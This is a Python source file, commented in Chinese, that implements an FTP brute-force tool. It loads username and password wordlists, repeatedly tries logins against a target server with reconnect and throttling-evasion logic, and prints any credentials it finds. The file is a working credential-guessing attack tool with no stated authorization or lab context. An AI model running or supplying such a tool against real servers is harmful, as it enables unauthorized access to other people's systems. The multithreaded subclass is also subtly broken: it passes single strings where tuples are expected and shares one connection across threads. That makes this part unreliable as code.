from ftplib import FTP, error_perm
from socket import timeout
from time import sleep
from os import path
from threading import Thread
from queue import Queue


class FtpBruteForce:
    attempted_times = 0  # 重新连接计数器
    """
    创建FTP对象
    加载用户名和密码字典
    进行登录尝试
    关闭连接
    """
    def __init__(self, server_address, user_dict_path, password_dict_path, server_port=21):
        """
        :param server_address: FTP服务器IPv4地址
        :param user_dict_path: 用户名字典路径
        :param password_dict_path: 密码字典路径
        :param server_port: FTP服务器端口,默认为21。
        """
        self.ftp = FTP()  # 创建FTP对象
        self.server_address = server_address
        self.user_dict_path = user_dict_path
        self.password_dict_path = password_dict_path
        self.server_port = server_port

    @staticmethod
    def error_message(message):
        """
        :param message: 要显示的信息（String类型）
        """
        print(f"\033[1;31m{message}\033[0m")  # 将报错消息标记为红色字体

    @staticmethod
    def stop(max_num):  # 当尝试次数达到一定值时，休眠5秒
        """
        :param max_num: 已经尝试的次数
        """
        if max_num % 5 == 0:
            sleep(5)

    class NeedReconnect(Exception):
        def __init__(self, message):
            super().__init__(message)

    def reconnect(self, connection=False):
        """
        :param connection: 是否需要重连，默认为False，True则重连
        """
        try:
            # 尝试发送一个简单的FTP命令来检查连接是否仍然有效
            self.ftp.voidcmd("NOOP")
        except (BrokenPipeError, EOFError, TimeoutError, error_perm):
            # 如果抛出了这四个异常，那么连接可能已经断开，就不调用quit方法并休眠5秒
            self.stop(5)
        finally:
            # 无论连接是否已经断开，都尝试重新连接
            if not connection:
                self.ftp.connect(self.server_address, self.server_port, timeout=10)

    def load_dict(self):
        """
        :return: 字符串类型的用户名集合和密码元组，如果文件不存在则返回(None, None)
        """
        # 利用集合去重
        user_set = set()  # 用户名集合
        password_set = set()  # 密码集合
        # 判断字典文件是否存在，存在则继续导入字典
        if path.exists(self.user_dict_path) and path.exists(self.password_dict_path):
            try:
                # 导入用户名字典
                with open(self.user_dict_path, "r") as user_file:
                    for user in user_file:
                        user = user.strip()
                        if user != "":
                            user_set.add(user)
                # 导入密码字典
                with open(self.password_dict_path, "r") as password_file:
                    for password in password_file:
                        password = password.strip()
                        if password != "":
                            password_set.add(password)
            except EOFError:
                self.stop(5)
                self.reconnect()
        else:
            self.error_message("字典文件不存在")
            return None, None

        return tuple(user_set), tuple(password_set)

    def connection(self):
        """
        :return: FTP服务器的IPv4地址和端口
        """
        while True:
            try:
                if self.attempted_times == 5:
                    raise FtpBruteForce.NeedReconnect("多次连接失败")
            except self.NeedReconnect as reconnect_error:
                self.error_message(f"错误：{reconnect_error}，尝试重新连接")
                self.stop(self.attempted_times)
                self.reconnect(connection=True)     # 当连接失败次数达到5次时引发NeedReconnect错误，休眠5秒再重新连接

            try:
                reply = self.ftp.connect(self.server_address, self.server_port, timeout=10)
                if "220" in reply:
                    print("连接成功！")
                    break
            except ConnectionRefusedError as connect_error:
                self.attempted_times += 1
                self.error_message(f"错误：{connect_error},连接被拒绝，服务可能未运行或已达到最大连接数量。")
                continue
            except (TimeoutError, timeout) as timeout_error:
                self.attempted_times += 1
                self.error_message(f"错误：{timeout_error}，连接超时，请检查网络连接和FTP服务器是否正常运行。")
                continue

        self.attempted_times = 0    # 重置类中的重试计数器，使其能重新使用

        return self.server_address, self.server_port

    def login(self, user_dict_tuples=None, password_tuples=None):
        """
        :param user_dict_tuples: 用户名字典元组
        :param password_tuples: 密码字典元组
        :return: 无返回值
        """
        if user_dict_tuples is None or password_tuples is None:
            raise ValueError("用户名字典或密码字典为空，请先调用load_dict方法加载用户名和密码字典")
        else:
            for user_index, user in enumerate(user_dict_tuples):
                for password_index, password in enumerate(password_tuples):
                    self.attempted_times = 0  # 重置尝试计数器，针对每个用户名和密码组合
                    found_valid_login = False
                    while self.attempted_times < 5:     # 当登录超时计数器达到5次时，重新开始
                        try:
                            self.ftp.login(user, password)
                            print(f"\033[1;32m登录成功: 用户名：{user}, 密码：{password}\033[0m")
                            found_valid_login = True
                            break  # 登录成功，退出函数
                        except error_perm as error:
                            # error_login.append(self.error_message(f"用户名：{user} 密码：{password} 登录失败，原因：{error}"))
                            # break  # 密码错误，尝试下一个密码
                            if "530 Permission denied" in str(error):
                                self.error_message(f"用户名：{user} 密码：{password} 登录失败，FTP拒绝连接")
                                break
                            elif "530 Login incorrect" in str(error):
                                self.error_message(f"用户名：{user} 密码：{password} 登录失败")
                                break
                            else:
                                pass
                            # 如果报错 530 Permission denied 可能是以下原因：
                            #                     # 1.登录凭证错误。
                            #                     # 2.账户权限不足
                            #                     # 3.Firewalld或SELinux策略限制：
                            #                     # 4.用户被禁止访问FTP服务器。
                            #                     # 5./etc/vsftpd/vsftpd.conf配置问题
                        except (TimeoutError, BrokenPipeError):
                            self.error_message(f"用户名：{user} 密码：{password} 登录超时")
                            self.attempted_times += 1
                            if self.attempted_times >= 5:
                                self.error_message(f"尝试次数超过限制，将跳过此用户密码组合")
                                break  # 尝试次数达到上限，跳过此组合
                            else:
                                self.reconnect()  # 重连
                                continue  # 继续尝试登录
                        except (EOFError, ConnectionResetError):
                            self.reconnect()
                            continue
                    # 如果到达这里，说明已找到有效的登录信息，退出程序
                    if found_valid_login:
                        exit()
                    # 如果到达这里，说明当前用户的所有密码都已尝试过
                    if password_index + 1 < len(password_tuples):
                        continue
                    else:
                        self.error_message(f"当前用户和密码组合尝试完毕，未找到有效登录信息")

    def __del__(self):
        self.reconnect(connection=True)


# 创建多线程登录子类
class MultiThreadedLogin(FtpBruteForce):
    """
    多线程登录破解
    """
    def __init__(self, server_address, user_dict_path, password_dict_path, user_tuple, password_tuple, server_port=21):
        super().__init__(server_address, user_dict_path, password_dict_path, server_port)
        self.users = user_tuple
        self.passwords = password_tuple
        self.threads = []

    def start_brute_force(self):
        for user in self.users:
            user_passwords = Queue()
            for password in self.passwords:
                user_passwords.put(password)

            thread = Thread(target=self.login_threaded, args=(user, user_passwords))
            self.threads.append(thread)
            thread.start()

    def login_threaded(self, user, passwords_queue):
        """
        :param user: 字符串类型的用户名序列
        :param passwords_queue: 包含待尝试密码的序列
        :return: 无返回值
        """
        while not passwords_queue.empty():
            password = passwords_queue.get()
            self.login(user, password)
            passwords_queue.task_done()

    def join_all_threads(self):
        for thread in self.threads:
            thread.join()
